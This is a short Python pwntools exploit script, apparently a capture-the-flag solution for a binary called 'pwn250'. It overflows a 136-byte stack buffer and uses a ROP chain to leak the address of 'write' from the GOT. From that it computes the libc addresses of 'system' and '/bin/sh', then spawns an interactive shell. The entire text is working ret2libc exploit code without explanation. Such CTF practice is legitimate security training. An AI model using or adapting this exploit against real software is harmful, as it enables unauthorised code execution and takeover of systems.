#!/usr/bin/env python
#TnMch

from pwn import *

libc = ELF('libc.so')
elf = ELF('pwn250')

p = process('./pwn250')

popret=0x00400633
pop3=0x0040056a
main=0x00400592

plt_wr = elf.symbols['write']
got_wr = elf.got['write']

payload1 = 'A'*136
payload1 += p64(pop3)
payload1 += p64(0x1)
payload1 += p64(got_wr)
payload1 += p64(0x8)
payload1 += p64(plt_wr)
payload1 += p64(main)
p.send(payload1)

write = u64(p.recv(8))
system = write - (libc.symbols['write'] - libc.symbols['system'])
binsh = write - (libc.symbols['write'] - next(libc.search('/bin/sh')))

payload2 = 'A'*136
payload2 += p64(popret)
payload2 += p64(binsh)
payload2 += p64(system)
payload2 += p64(main)#we can remove this 
p.send(payload2)
p.interactive()
